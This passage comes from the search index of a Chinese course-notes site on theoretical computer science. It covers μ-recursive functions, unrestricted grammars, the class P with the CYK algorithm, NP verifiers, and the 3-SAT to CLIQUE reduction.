<p>\u6240\u6709\u7684\u539f\u59cb\u9012\u5f52\u51fd\u6570\u90fd\u53ef\u4ee5\u901a\u8fc7\u7c7b\u4f3c\u6b63\u5219\u8868\u8fbe\u5f0f\u4e00\u6837\u7684\u65b9\u5f0f\u6765\u63cf\u8ff0\uff0c\u610f\u5473\u7740\u539f\u59cb\u9012\u5f52\u51fd\u6570\u662f\u53ef\u4ee5\u679a\u4e3e\u7684\u3002\u6240\u4ee5\u6784\u9020\u56fe\u7075\u673a \\(M\\) = on input \\(n\\):</p> <ol> <li>enumerate all unary primitive recursive functions \\(g_1, g_2, \\cdots\\) to get \\(g_n\\)</li> <li>compute \\(g_n(n)\\)</li> <li>return \\(g_n(n) + 1\\)</li> </ol> <p>\u79f0 \\(M\\) \u8fd9\u65f6\u5019 compute \\(g^*\\)\uff0c\u4f46 \\(g^*\\neq g_n\\)\uff0c\u6240\u4ee5 \\(g^*\\) \u4e0d\u662f\u539f\u59cb\u9012\u5f52\u51fd\u6570\u3002</p>"},{"location":"cs/tcs/toc/topic5/#-","title":"\u03bc-\u9012\u5f52\u51fd\u6570","text":"<ul> <li>\u5728\u539f\u59cb\u9012\u5f52\u51fd\u6570\u7684\u57fa\u7840\u4e0a\u9644\u52a0\u4e00\u4e2a\u64cd\u4f5c\uff1aminimalization of minimalizable functions<ul> <li>\u7ed9\u5b9a\u51fd\u6570 \\(g\\colon\\mathbb{N}^{k+1}\\to\\mathbb{N}\\)</li> <li>\u4ee4 \\(f(n_1, \\cdots, n_k) = \\begin{cases}\\text{minimum }m\\text{ with }g(n_1, \\cdots, n_k, m) = 1 &amp;\\text{if exists}\\\\ 0 &amp;\\text{otherwise}\\end{cases}\\)</li> <li>\u79f0 \\(f\\) is a minimalization of \\(g\\)\uff0c\u8bb0\u4f5c \\(\\mu m[g(n_1, \\cdots, n_k, m) = 1]\\)</li> </ul> </li> </ul> \u03bc-\u9012\u5f52\u51fd\u6570\u7684\u4f8b\u5b50 \\(\\log(m, n) = \\lceil\\log_{m+2}(n+1)\\rceil\\) \u76f8\u5f53\u4e8e \\(\\min\\{p:(m+2)^p\\geq n+1\\}\\)\uff0c\u5373 \\(\\mu p[\\mathrm{geq}((m+2)^p, n+1) = 1]\\) <ul> <li>\u4e00\u4e2a\u51fd\u6570 \\(g\\) \u662f minimalizable \u7684\u5982\u679c<ul> <li>\\(g\\) \u662f\u53ef\u8ba1\u7b97\u7684</li> <li>\u5bf9\u4e8e\u4efb\u610f \\(n_1, \\cdots n_k\\)\uff0c\u90fd\u5b58\u5728 \\(m\\geq 0\\) \u4f7f\u5f97 \\(g(n_1, \\cdots, n_k, m) = 1\\)</li> </ul> </li> <li>minimalization of \\(g\\) is computable if \\(g\\) is minimalizable<ul> <li>\u5224\u65ad\u4e00\u4e2a\u53ef\u8ba1\u7b97\u51fd\u6570 \\(g\\) \u662f\u5426\u662f minimalizable \u7684\u662f\u4e0d\u53ef\u5224\u5b9a\u7684\uff08\u505c\u673a\u95ee\u9898\uff09</li> </ul> </li> </ul> Theorem. \u6570\u503c\u51fd\u6570 \\(f\\) \u662f \u03bc-\u9012\u5f52\u7684\u5f53\u4e14\u4ec5\u5f53\u5b83\u53ef\u8ba1\u7b97 <p>Proof. \u5de6\u63a8\u53f3\uff0c\u5404\u4e09\u4e2a\u64cd\u4f5c\u90fd\u4fdd\u7559\u53ef\u8ba1\u7b97\u6027\uff0c\u6240\u4ee5\u663e\u7136\u3002</p> <p>\u53f3\u63a8\u5de6\uff0cProof Sketch: \\(f\\) \u53ef\u8ba1\u7b97 =&gt; \u5b58\u5728\u56fe\u7075\u673a \\(M\\) computes \\(f\\) =&gt; \\((s, \\rhd\\underline{\u2334}n)\\vdash_M(q_1, \\rhd u_1\\underline{a_1}v_1)\\vdash_M\\cdots\\vdash_M(h, \\rhd\\underline{\u2334}f(n))\\)</p> <p>\u5c06\u8fd9\u4e2a\u8f6c\u6362\u8fc7\u7a0b\u63d0\u53d6\u79f0\u4e32 \\(\\rhd\u2334sn\\!\\rhd\\!u_1a_1q_1v_1\\cdots\\rhd\\!\u2334hf(n)\\)\uff08\u628a\u72b6\u6001\u653e\u5728\u5f53\u524d\u8bfb\u5199\u5934\u53f3\u4fa7\uff09\u3002\u901a\u8fc7\u6620\u5c04 \\(\\Sigma\\cup K\\to\\{0, \\cdots, b-1\\}\\)\uff08\u5176\u4e2d \\(b=|\\Sigma\\cup K|\\)\uff09\u5c06\u8fd9\u4e2a\u4e32\u8f6c\u6362\u4e3a \\(b\\) \u8fdb\u5236\u7684\u6574\u6570\uff0c\u6240\u4ee5\u6574\u4e2a\u7684\u8f6c\u6362\u8fc7\u7a0b\u5c31\u662f\uff1a</p> \\[ n\\to\\rhd\u2334sn\\to\\rhd\u2334sn\\!\\rhd\\!u_1a_1q_1v_1\\cdots\\rhd\\!\u2334hf(n)\\to\\rhd\u2334hf(n)\\to f(n) \\] <p>\u8fd9\u91cc\u6bcf\u4e2a\u90fd\u662f\u4e00\u4e2a \\(b\\) \u8fdb\u5236\u6574\u6570\uff0c\u6240\u4ee5\u53ea\u8981\u8bc1\u660e\u6bcf\u4e00\u6b21\u8f6c\u6362\u7684\u51fd\u6570\u90fd\u662f \u03bc-\u9012\u5f52\u7684\u5373\u53ef\uff1a</p> <ul> <li>\\(n\\)<ul> <li>\\(h_1(n) = \\rhd\u2334s\\cdot b^{\\log_b n} + n\\)\uff08\u5728\u524d\u9762\u6dfb\u52a0 \\(\\rhd\u2334s\\)\uff09</li> </ul> </li> <li>\\(\\rhd\u2334sn\\)<ul> <li>\\(h_2(n) = \\mu m[\\mathrm{iscomp}(\\rhd\u2334sn, m)\\land\\mathrm{ishalted}(m)]\\)<ul> <li>\u627e\u5230\u4e00\u4e2a\u6700\u5c0f\u7684\u4e32\uff0c\u4f7f\u4e4b\u53ef\u4ee5\u7531 \\(\\rhd\u2334sn\\) \u751f\u6210\uff0c\u5e76\u4e14\u6700\u7ec8\u662f\u505c\u673a\u72b6\u6001</li> <li>\\(\\mathrm{iscomp}\\) \u548c \\(\\mathrm{ishalted}\\) \u90fd\u662f\u539f\u59cb\u9012\u5f52\u7684\uff0c\u4f46\u6ca1\u6709\u8bc1\u660e</li> </ul> </li> </ul> </li> <li>\\(\\rhd\u2334sn\\!\\rhd\\!u_1a_1q_1v_1\\cdots\\rhd\\!\u2334hf(n)\\)<ul> <li>\\(h_3(n) = \\mathrm{rem}(n, b^{k^*+1})\\) \u5176\u4e2d \\(k^* = \\mu k[\\mathrm{isdigit}(k, n, b) = \\rhd]\\)<ul> <li>\u627e\u5230\u6700\u540e\u4e00\u4e2a \\(\\rhd\\) \u7684\u4f4d\u7f6e\u5e76\u53d6\u5176\u548c\u5176\u540e\u7684\u90e8\u5206</li> </ul> </li> </ul> </li> <li>\\(\\rhd\u2334hf(n)\\)<ul> <li>\\(h_4\\) \u548c \\(h_3\\) \u540c\u7406\uff0c\u627e\u6700\u540e\u4e00\u4e2a \\(h\\) \u7684\u4f4d\u7f6e\u5e76\u53d6\u5176\u540e\u7684\u90e8\u5206</li> </ul> </li> <li>\\(f(n)\\)</li> </ul>"},{"location":"cs/tcs/toc/topic5/#unrestricted-grammar","title":"Unrestricted Grammar","text":"<p>\u5e94\u8be5\u4e0d\u5c5e\u4e8e\u8fd9\u4e00\u7ae0\uff0c\u4f46\u5148\u8bb0\u5728\u8fd9\u91cc\u4e86</p> <ul> <li>Context-Free Grammar \u65e0\u4e0a\u4e0b\u6587\uff0c\u800c\u8fd9\u91cc\u7684 Grammar \u53ef\u4ee5\u6709\u4e0a\u4e0b\u6587<ul> <li>\u5373\u4f8b\u5982 \\(uAv\\to w\\)\uff0c\u53ea\u6709\u4e0a\u4e0b\u6587 \\(uv\\) \u90fd\u5339\u914d\u4e86\u624d\u53ef\u4ee5\u8fdb\u884c\u66ff\u6362</li> </ul> </li> <li>\u4e00\u4e2a Grammar \u540c\u6837\u662f\u4e00\u4e2a\u56db\u5143\u7ec4 \\(G=(V, \\Sigma, S, R)\\)<ul> <li>\\(V, \\Sigma, S\\) \u5b9a\u4e49\u548c CFG \u76f8\u540c</li> <li>\\(R\\) is a finite subset of \\((V^*(V-\\Sigma)V^*)\\times V^*\\)<ul> <li>\u5bf9\u6bd4 CFG \u7684 \\(R\\subseteq (V-\\Sigma)\\times V^*\\)\uff0c\u53ef\u89c1\u5176\u591a\u4e86\u4e0a\u4e0b\u6587 \\(V^*\\)</li> </ul> </li> <li>\u540c\u6837\u53ef\u4ee5\u5b9a\u4e49 \\(\\Rightarrow_G, \\Rightarrow_G^*\\) \u4ee5\u53ca\u751f\u6210\u8bed\u8a00 \\(L(G)\\)</li> </ul> </li> </ul> \u7ed9\u51fa\u8bed\u8a00 \\(\\{a^nb^nc^n:n\\geq 0\\}\\) \u7684\u6587\u6cd5 <ul> <li>\\(S\\to ABCS\\)\uff1a\u751f\u6210 \\(ABCABC\\cdots ABCS\\)</li> <li>\\(BA\\to AB,\\ CA\\to AC,\\ CB\\to BC\\)\uff1a\u91cd\u6392\u4e3a \\(A\\cdots AB\\cdots BC\\cdots CS\\)</li> <li>\\(S\\to T_c\\)\uff1a\u7ed3\u5c3e\u53d8\u6210\u6807\u5fd7\u7b26</li> <li>\\(CT_c\\to T_cc,\\ BT_c\\to BT_b\\)\uff1a\u5411\u5de6\u66ff\u6362\u6240\u6709\u7684 \\(C\\)\uff0c\u5e76\u5728\u9047\u5230 \\(B\\) \u65f6\u53d8\u6210 \\(T_b\\)</li> <li>\\(BT_b\\to T_bb,\\ AT_b\\to AT_a\\)\uff1a\u540c\u7406</li> <li>\\(AT_a\\to T_aa,\\ T_a\\to e\\)</li> </ul> Theorem. \u4e00\u4e2a\u8bed\u8a00\u53ef\u4ee5\u88ab\u67d0\u4e00\u6587\u6cd5\u751f\u6210\u5f53\u4e14\u4ec5\u5f53\u5b83\u53ef\u4ee5\u88ab\u67d0\u4e00\u56fe\u7075\u673a\u534a\u5224\u5b9a <p>Proof. \u5de6\u63a8\u53f3\uff0c\u7ed9\u5b9a\u6587\u6cd5 \\(G\\) \u9700\u8981\u7ed9\u51fa\u4e00\u4e2a\u56fe\u7075\u673a \\(M\\) \u534a\u5224\u5b9a \\(L(G)\\) \u5373\u53ef\uff0c\u6240\u4ee5\u53ea\u9700\u8981\u679a\u4e3e\u6587\u6cd5\u53ef\u4ee5\u751f\u6210\u7684\u6240\u6709\u5b57\u7b26\u4e32\u518d\u8fdb\u884c\u6bd4\u8f83\u5373\u53ef\u3002</p> <p>\u53f3\u63a8\u5de6\uff0c\u7ed9\u5b9a\u56fe\u7075\u673a \\(M\\) \u8981\u627e\u6587\u6cd5 \\(G\\) \u751f\u6210 \\(L(M)\\)\u3002\u56fe\u7075\u673a\u534a\u5224\u5b9a\u7684\u8fc7\u7a0b\u4e2d\uff0c\u7eb8\u5e26\u4e0a\u7684\u53d8\u5316\uff1a</p> \\[ \\rhd\u2334sw\\vdash\\rhd\u2334u_1a_1q_1v_1\\vdash\\cdots\\vdash\\rhd\u2334h \\] <p>\u6240\u4ee5\u6211\u4eec\u671f\u671b\u6587\u6cd5 \\(G\\) \u7684\u8868\u73b0\u662f\u53ef\u4ee5\u7ed9\u51fa\u5982\u4e0b\u7684\u66ff\u6362\u94fe\uff1a</p> \\[ S\\Rightarrow \\rhd\u2334h\\triangle\\Rightarrow\\cdots\\Rightarrow\\rhd\u2334u_1a_1q_1v_1\\triangle\\Rightarrow\\rhd\u2334sw\\triangle\\Rightarrow w \\] <p>\u5373\u4ece\u505c\u673a\u72b6\u6001\u5f80\u524d\u63a8\uff0c\u4e00\u76f4\u627e\u5230\u521d\u59cb\u72b6\u6001\u5f97\u5230\u5b57\u7b26\u4e32 \\(w\\)\uff0c\u5e76\u4e14\u5728\u4e2d\u95f4\u7ed9\u6bcf\u4e2a\u72b6\u6001\u52a0\u4e0a\u4e00\u4e2a\u4e09\u89d2\u6807\u8bb0\u7ed3\u5c3e\u3002\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u6784\u9020 \\(G\\) \u7684\u8f6c\u6362\u89c4\u5219\uff1a</p> <ul> <li>\\(\\rhd\u2334s\\to e,\\ \\triangle\\to e\\)\uff1a\u5c06\u6700\u540e\u5b57\u7b26\u4e32\u7684\u5f00\u5934\u7ed3\u5c3e\u53bb\u6389</li> <li>\u679a\u4e3e\u56fe\u7075\u673a\u7684\u6bcf\u6761\u8f6c\u6362\u89c4\u5219\uff1a<ul> <li>\u5982\u679c \\(\\delta(q, a) = (p, b)\\)\uff0c\u5373\u56fe\u7075\u673a\u8fd9\u6761\u89c4\u5219\u5728\u8fdb\u884c\u5199\u64cd\u4f5c<ul> <li>\u6211\u4eec\u77e5\u9053\u6b64\u65f6\u56fe\u7075\u673a\u5728 \\(uaqv\\triangle\\vdash_M ubpv\\triangle\\)</li> <li>\u6240\u4ee5\u9006\u63a8\u56de\u6765\u5e76\u53bb\u6389\u65e0\u7528\u7684\u4e0a\u4e0b\u6587\u5f97\u5230 \\(bp\\to aq\\)</li> </ul> </li> <li>\u5982\u679c \\(\\delta(q, a) = (p, \\rightarrow)\\)\uff0c\u5373\u8bfb\u5199\u5934\u53f3\u79fb<ul> <li>\u6b64\u65f6\u56fe\u7075\u673a \\(uaqbv\\triangle\\vdash_M uabpv\\triangle\\)</li> <li>\u5219\u6dfb\u52a0\u89c4\u5219\uff0c\u5bf9\u4e8e\u4efb\u610f \\(b\\in\\Sigma, abp\\to aqb\\)\uff08\u8fd9\u91cc \\(a\\) \u4e0d\u80fd\u53bb\u6389\uff0c\u662f\u6709\u7528\u7684\u4e0a\u4e0b\u6587\uff09</li> <li>\u5982\u679c \\(b=\u2334\\) \u4e14 \\(v=e\\)\uff0c\u5219 \\(a\u2334p\\triangle\\to aq\\triangle\\)</li> </ul> </li> <li>\u5982\u679c \\(\\delta(q, a) = (p, \\leftarrow)\\)\uff0c\u5373\u8bfb\u5199\u5934\u5de6\u79fb\uff0c\u548c\u53f3\u79fb\u540c\u7406</li> </ul> </li> </ul>"},{"location":"cs/tcs/toc/topic6/","title":"\u590d\u6742\u5ea6\u7406\u8bba","text":"<p> \u7ea6 3430 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 11 \u5206\u949f</p> <p>Abstract</p> <p>\u7406\u8bba\u8ba1\u7b97\u673a\u79d1\u5b66\u5bfc\u5f15\u7b2c\u5341\u56db\u81f3\u7b2c\u5341\u516d\u5468\u8bfe\u7a0b\u5185\u5bb9</p>"},{"location":"cs/tcs/toc/topic6/#_2","title":"\u65f6\u95f4\u590d\u6742\u5ea6","text":""},{"location":"cs/tcs/toc/topic6/#p","title":"P \u95ee\u9898","text":"<ul> <li>\u8003\u8651\u5224\u5b9a\u95ee\u9898 \\(A=\\{0^k1^k:k\\geq 0\\}\\)<ul> <li>\u5355\u5e26\u56fe\u7075\u673a\u4e0a\uff0c\u6bcf\u6b21\u6d88\u4e00\u4e2a 01\uff0c\u590d\u6742\u5ea6 \\(\\frac{n}{2}O(n) = O(n^2)\\)</li> <li>\u5355\u5e26\u56fe\u7075\u673a\u4e0a\uff0c\u6bcf\u6b21\u6d88\u4e00\u534a\uff0c\u590d\u6742\u5ea6 \\(O(n\\log n)\\)</li> <li>\u53cc\u5e26\u56fe\u7075\u673a\u4e0a\u53ef\u4ee5\u8fbe\u5230 \\(O(n)\\)</li> </ul> </li> <li>\u5b9a\u4e49 \\(M\\) \u662f\u5728\u4efb\u610f\u8f93\u5165\u4e0a\u505c\u673a\u7684 DTM<ul> <li>\\(M\\) \u7684 running time \u662f\u4e00\u4e2a\u51fd\u6570 \\(f\\colon\\mathbb{N}\\to\\mathbb{N}\\)\uff0c\\(f(n)\\) \u662f \\(M\\) \u5728\u8f93\u5165\u957f\u5ea6\u4e3a \\(n\\) \u7684\u8f93\u5165\u4e0a\u7684\u6700\u5927\u8fd0\u884c\u6b65\u6570</li> <li>\\(\\mathrm{DTIME}(t(n))\\) \u662f\u6240\u6709\u5728 \\(O(t(n))\\) \u65f6\u95f4\u5185\u505c\u673a\u7684 standard TM \u7684\u96c6\u5408</li> <li>\u591a\u5e26\u56fe\u7075\u673a running time \u4e3a \\(t(n)\\) \u5219\u5316\u4e3a\u6807\u51c6\u56fe\u7075\u673a\u4e3a \\(t^2(n)\\)\uff08\u6700\u5927\uff09</li> <li>\u786e\u5b9a\u6027\u53d8\u4f53 running time \u4e3a \\(t(n)\\) \u5219\u5316\u4e3a\u6807\u51c6\u56fe\u7075\u673a\u4e3a \\(\\mathrm{poly(t(n))}\\)</li> </ul> </li> <li>Cobham-Edmonds Thesis\uff1a\u4efb\u4f55 \"reasonable\" \u4e14 \"general\" \u7684\u786e\u5b9a\u6027\u8ba1\u7b97\u6a21\u578b\u90fd\u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u6a21\u62df\u56fe\u7075\u673a</li> <li>\u5b9a\u4e49 \\(P\\) \u662f\u6240\u6709\u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u88ab\u786e\u5b9a\u6027\u56fe\u7075\u673a\u5224\u5b9a\u7684\u8bed\u8a00\u7684\u96c6\u5408<ul> <li>\\(P = \\bigcup_{k\\geq 0}\\mathrm{DTIME}(n^k)\\)</li> </ul> </li> </ul> Theorem. every CFL is in \\(P\\) <p>Proof. \u4efb\u610f CFL \\(A\\)\uff0c\u5b58\u5728\u4e00\u4e2a CFG \\(G=(V, \\Sigma, R, S)\\) \u751f\u6210 \\(A\\) \u4e14\u662f CNF \u7684\u3002\uff08\u8bf4\u660e\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26\u4e32 \\(w\\in A\\)\uff0c\u9700\u8981\u5728 \\(2|w| - 1\\) \u6b65\u5185\u751f\u6210\uff09</p> <p>\u4f46\u679a\u4e3e\u6240\u6709\u957f\u5ea6\u4e3a \\(2|w|-1\\) \u7684\u5b57\u7b26\u4e32\u9700\u8981 \\(|R|^{2|w|-1}\\) \u590d\u6742\u5ea6\uff0c\u975e\u591a\u9879\u5f0f\u3002\u6240\u4ee5\u8981\u901a\u8fc7 dp \u6765\u5b9e\u73b0\uff0c\u5047\u8bbe \\(w=a_1\\cdots a_n\\)\uff0c\u95ee\u662f\u5426\u6709 \\(S\\Rightarrow^* w\\)\u3002</p> <ul> <li>\u5bf9\u4e8e \\(1\\leq i\\leq j\\leq n\\)\uff0c\u5b9a\u4e49 \\(T[i, j] = \\{A\\in V-\\Sigma: A\\Rightarrow a_ia_{i+1}\\cdots a_j\\}\\)</li> <li>Goal\uff1a\u662f\u5426\u6709 \\(S\\in T[1, n]\\)</li> <li>Base case\uff1a\u5bf9\u4e8e \\(1\\leq i\\leq n\\)\uff0c\u6709 \\(T[i, i] = \\{A\\in V-\\Sigma: (A, a_i)\\in R\\}\\)</li> <li>Recurrence\uff1a\u5bf9\u4e8e \\(1\\leq i\\leq j\\leq n\\)\uff0c\u6709 \\(T[i, j] = \\bigcup_{k=i}^{j-1}\\{A\\rightarrow BC: B\\Rightarrow^* a_i\\cdots a_k\\land C\\Rightarrow^* a_{k+1}\\cdots a_j\\}\\)<ul> <li>\u5373 \\(T[i, j] = \\bigcup_{k=i}^{j-1}\\{B\\in T[i, k]\\land C\\in T[k+1, j]\\}\\)</li> </ul> </li> </ul> <p>\u5b50\u95ee\u9898\u6570\u91cf\u4e3a \\(\\dfrac{n^2}{2}\\)\uff0c\u6bcf\u4e2a\u5b50\u95ee\u9898\u9700\u8981\u6d88\u8017 \\(n\\cdot |R|\\) \u65f6\u95f4\uff0c\u603b\u5171\u9700\u8981 \\(O(n^3|R|)=O(n^3)\\) \u65f6\u95f4\uff0c\u662f\u591a\u9879\u5f0f\u3002</p>"},{"location":"cs/tcs/toc/topic6/#sat-np","title":"SAT \u4e0e NP \u95ee\u9898","text":"<ul> <li>SAT \u5373\u6ee1\u8db3\u6027\u95ee\u9898\uff0c\u7ed9\u4e00\u4e2a\u5e03\u5c14\u8868\u8fbe\u5f0f\uff0c\u95ee\u662f\u5426\u5b58\u5728\u4e00\u79cd\u53d8\u91cf\u7684\u7ec4\u5408\u4f7f\u6574\u4f53\u503c\u4e3a\u771f<ul> <li>\u6bd4\u5982 \\((x_1\\lor x_2\\lor x_3)\\land(x_2\\lor\\overline{x_3}\\lor x_4)\\land(x_1\\lor x_2\\lor x_4\\lor x_5)\\)</li> </ul> </li> <li>\u5b9a\u4e49 \\(M\\) \u662f\u4e00\u4e2a\u975e\u786e\u5b9a\u6027\u56fe\u7075\u673a\uff0c\u5bf9\u4e8e\u4efb\u610f\u8f93\u5165\uff0c\u6bcf\u4e2a\u5206\u652f\u90fd\u5728 \\(k\\) \u6b65\u5185\u505c\u673a\uff0c\u5176\u4e2d \\(k\\) \u53ea\u53d6\u51b3\u4e8e\u8f93\u5165<ul> <li>\\(M\\) \u7684 running time \u662f\u4e00\u4e2a\u51fd\u6570 \\(f\\colon\\mathbb{N}\\to\\mathbb{N}\\)\uff0c\u5bf9\u4e8e\u4efb\u610f\u957f\u5ea6\u4e3a \\(n\\) \u7684\u8f93\u5165\uff0c\\(M\\) \u7684\u6bcf\u4e2a\u5206\u652f\u90fd\u5728 \\(f(n)\\) \u6b65\u5185\u505c\u673a</li> </ul> </li> <li>SAT \u53ef\u4ee5\u88ab\u975e\u786e\u5b9a\u6027\u56fe\u7075\u673a\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u89e3\u51b3\uff08\u975e\u786e\u5b9a\u6027\u751f\u6210\u53d8\u91cf\u518d\u9a8c\u8bc1\u5373\u53ef\uff09</li> <li>\u5b9a\u4e49 \\(NP\\) \u662f\u6240\u6709\u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u88ab\u975e\u786e\u5b9a\u6027\u56fe\u7075\u673a\u5224\u5b9a\u7684\u8bed\u8a00\u7684\u96c6\u5408</li> <li>\u5b9a\u4e49\u4e00\u4e2a\u8bed\u8a00 \\(A\\) \u88ab\u79f0\u4e3a\u591a\u9879\u5f0f\u53ef\u9a8c\u8bc1\u7684\uff08polynomially verifiable\uff09\uff0c\u5982\u679c\u5b58\u5728\u4e00\u4e2a\u591a\u9879\u5f0f\u65f6\u95f4 DTM \\(V\\) \u6ee1\u8db3\u5bf9\u4e8e\u4efb\u610f \\(x\\in\\Sigma^*\\)\uff1a<ul> <li>\u5982\u679c \\(x\\in A\\)\uff0c\u5219\u5b58\u5728 \\(y\\) with \\(|y|\\leq\\mathrm{poly}(|x|)\\) \u4f7f\u5f97 \\(V\\) accepts \\(\\mathtt{\"}x\\mathtt{\"}\\mathtt{\"}y\\mathtt{\"}\\)</li> <li>\u5982\u679c \\(x\\notin A\\)\uff0c\u5219\u5bf9\u4e8e\u4efb\u610f \\(y\\) with \\(|y|\\leq\\mathrm{poly}(|x|)\\)\uff0c\\(V\\) rejects \\(\\mathtt{\"}x\\mathtt{\"}\\mathtt{\"}y\\mathtt{\"}\\)</li> </ul> </li> </ul> SAT \u95ee\u9898\u662f\u591a\u9879\u5f0f\u53ef\u9a8c\u8bc1\u7684 <ul> <li>\\(A\\) = SAT</li> <li>\\(x\\) = boolean formular</li> <li>\\(y\\) = a truth assignment that satisfies \\(x\\)</li> <li>\\(V\\) = on input \\(\\mathtt{\"}x\\mathtt{\"}\\mathtt{\"}y\\mathtt{\"}\\):<ol> <li>evaluate \\(x\\) under \\(y\\)</li> <li>if \\(x\\) is satisfied by \\(y\\)</li> <li>\u2003\u2003accepts \\(\\mathtt{\"}x\\mathtt{\"}\\mathtt{\"}y\\mathtt{\"}\\)</li> <li>else</li> <li>\u2003\u2003rejects \\(\\mathtt{\"}x\\mathtt{\"}\\mathtt{\"}y\\mathtt{\"}\\)</li> </ol> </li> </ul> Theorem. \u8bed\u8a00 \\(A\\) \u662f\u591a\u9879\u5f0f\u53ef\u5224\u5b9a\u7684\u5f53\u4e14\u4ec5\u5f53\u5b83\u662f \\(NP\\) \u95ee\u9898 <p>Proof. \u5de6\u63a8\u53f3\uff0c\u5b58\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u7684 verifier \\(V\\)\uff0c\u9700\u8981\u6784\u5efa\u4e00\u4e2a NTM \\(M\\) \u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u5224\u5b9a \\(A\\)\u3002\u6784\u9020 \\(M\\) = on input \\(\\mathtt{\"}x\\mathtt{\"}\\):</p> <ol> <li>non-deterministically generate a certificate \\(y\\) with \\(|y|\\leq\\mathrm{poly}(|x|)\\)</li> <li>run \\(V\\) on input \\(\\mathtt{\"}x\\mathtt{\"}\\mathtt{\"}y\\mathtt{\"}\\)</li> <li>if \\(V\\) accepts \\(\\mathtt{\"}x\\mathtt{\"}\\mathtt{\"}y\\mathtt{\"}\\)</li> <li>\u2003\u2003accepts \\(\\mathtt{\"}x\\mathtt{\"}\\)</li> <li>else</li> <li>\u2003\u2003rejects \\(\\mathtt{\"}x\\mathtt{\"}\\)</li> </ol> <p>\u53f3\u63a8\u5de6\uff0c\u5b58\u5728\u4e00\u4e2a NTM \\(M\\) \u591a\u9879\u5f0f\u65f6\u95f4\u5185\u5224\u5b9a \\(A\\)\uff0c\u9700\u8981\u6784\u9020\u4e00\u4e2a\u591a\u9879\u5f0f\u65f6\u95f4 verifier \\(V\\)\u3002\u6784\u9020 \\(V\\) = on input \\(\\mathtt{\"}x\\mathtt{\"}\\mathtt{\"}y\\mathtt{\"}\\):</p> <ol> <li>run \\(M\\) on \\(\\mathtt{\"}x\\mathtt{\"}\\) deterministically under the guidance of \\(y\\)</li> <li>if \\(M\\) accepts \\(\\mathtt{\"}x\\mathtt{\"}\\)</li> <li>\u2003\u2003accepts \\(\\mathtt{\"}x\\mathtt{\"}\\mathtt{\"}y\\mathtt{\"}\\)</li> <li>else</li> <li>\u2003\u2003rejects \\(\\mathtt{\"}x\\mathtt{\"}\\mathtt{\"}y\\mathtt{\"}\\)</li> </ol>"},{"location":"cs/tcs/toc/topic6/#np-complete","title":"NP-Complete \u95ee\u9898","text":"<ul> <li>\u5c1a\u4e0d\u77e5\u9053 \\(P\\) \u662f\u5426\u7b49\u4e8e \\(NP\\)</li> <li>\u4f46 \\(P\\subseteq NP\\)\uff0c\u56e0\u4e3a DTM \u4e5f\u662f NTM</li> <li>Cook &amp; levin \u63d0\u51fa\u4e86 NP-Complete \u95ee\u9898<ul> <li>\u5982\u679c\u4e00\u4e2a NP-Complete \u95ee\u9898\u662f\u4e00\u4e2a P \u95ee\u9898\uff0c\u5219 P = NP</li> </ul> </li> <li>\u5728\u89c4\u7ea6 \\(f: A\\leq B\\) \u7684\u57fa\u7840\u4e0a\u52a0\u4e0a\u6761\u4ef6 \\(f\\) \u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u88ab DTM \u8ba1\u7b97\uff0c\u5219\u79f0 \\(A\\) \u53ef\u4ee5\u5728\u591a\u9879\u5f0f\u65f6\u95f4\u5185\u89c4\u7ea6\u5230 \\(B\\)\uff0c\u8bb0\u4f5c \\(A\\leq_P B\\)</li> </ul> Theorem. \u5982\u679c \\(A\\leq_P B, B\\in P\\)\uff0c\u5219 \\(A\\in P\\) <p>\\(x\\to f(x)\\)\uff0c\u518d\u5224\u5b9a \\(f(x)\\in B\\) \u5373\u53ef\uff0c\u8f6c\u5316\u65f6\u95f4 \\(\\mathrm{poly}(|x|)\\)\uff0c\u5224\u5b9a\u65f6\u95f4 \\(\\mathrm{poly}(|f(x)|)\\)\uff0c\u4e14\u6709 \\(|f(x)|\\leq\\mathrm{poly}(|x|)\\)\uff0c\u6240\u4ee5\u603b\u65f6\u95f4\u4e5f\u662f\u591a\u9879\u5f0f\u65f6\u95f4\u3002</p> Clique \u56e2\u95ee\u9898 <p>\u5bf9\u4e8e\u4e00\u5f20\u56fe \\(G=(V, E)\\)\uff0c\u4e00\u4e2a\u56e2\uff08clique\uff09\u662f \\(V\\) \u7684\u4e00\u4e2a\u5b50\u96c6 \\(V'\\subseteq V\\)\uff0c\u4f7f\u5f97\u5bf9\u4e8e\u4efb\u610f \\(u, v\\in V'\\)\uff0c\\((u, v)\\in E\\)\u3002\u56e2\u95ee\u9898\u662f \\(\\mathrm{CLIQUE}=\\{\\mathtt{\"}G\\mathtt{\"}\\mathtt{\"}k\\mathtt{\"}: G\\text{ has a clique of at least }k\\}\\)\uff0c\u8981\u8bc1 \\(\\mathrm{3-SAT}\\leq_P\\mathrm{CLIQUE}\\)\u3002\uff083-SAT \u662f SAT \u7684\u4e00\u4e2a\u53d8\u4f53\uff0c\u6bcf\u4e2a\u5b50\u53e5\u6700\u591a\u6709 3 \u4e2a\u53d8\u91cf\uff0c\u53ef\u4ee5\u8bc1\u660e 3-SAT \u548c SAT \u662f\u7b49\u4ef7\u7684\uff09</p> <p>\u5bf9\u4e8e\u5408\u53d6\u8303\u5f0f \\(F\\)\uff0c\u6784\u9020\u4e00\u4e2a \\((G, k)\\)\u3002\u6bd4\u5982\u7ed9\u5b9a \\((x_1\\lor x_2\\lor\\overline{x_3})\\land(\\overline{x_1}\\lor x_2\\lor x_3)\\land(x_2\\lor x_3\\lor 